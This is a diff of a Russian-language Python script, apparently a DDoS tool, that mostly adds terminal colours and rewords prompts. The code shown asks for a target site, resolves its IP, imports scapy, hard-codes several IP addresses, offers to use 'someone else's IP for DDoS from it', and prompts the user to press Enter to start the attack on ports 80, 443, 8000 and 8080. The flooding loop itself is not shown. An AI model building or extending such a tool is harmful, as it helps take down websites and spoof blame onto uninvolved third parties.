@@ -11,7 +11,15 @@ print("З А Г Р У З К А....")
 time.sleep(2.5)
 os.system("clear")
 
-print("""
+#########Terminal colors################
+red = "\033[1;31m"
+blue = "\033[1;34m"
+green = "\033[1;32m"
+yellow = "\033[1;33m"
+white = "\033[1;37m"
+default = "\033[0m"
+
+print("\033[1;33m"
      __      ANONYMOUS       _____
     / /  __ _ _   _  ___ _  |___  |
    / /  / _` | | | |/ _ \ '__| / /
@@ -28,12 +36,13 @@ import requests
 import socket
 
 print()
+#########################################################################
 #ip
-url = input(" Url: => ")
+url = input("\033[94m╔═══\033[91m[ Url ] •\n\033[94m╠══>\033[0m ")
 url_chek =requests.get(url)
 ip = socket.gethostbyname(url.replace("https://","").replace("http://",""))
 print(ip)
-
+print()
 
 try:
     from scapy.all import *
@@ -45,7 +54,7 @@ except:
 
 ips = ['217.160.0.137', '212.164.222.45', '176.59.131.203']
 
-if input('Вы уже знаете IP адрес сайта, или вам нужно его найти? (y/n) ') == 'n':
+if input('Вы уже знаете IP адрес сайта? (y/n) ') == 'n':
     url = input('Введите адрес сайта(без https:// и http://): ')
     target = socket.gethostbyname(url)
 else:
@@ -58,7 +67,7 @@ if input('Вы хотите ввести чужой IP для DDoS с него? 
 target2 = input('Введите адрес сайта(с https:// или http://): => ')
 input('Enter начало атаки')
 
-ports = ['80', '8000', '8080', '443']
+ports = ['80','443','8000','8080']
 attack_num = 0
 port = 0
 
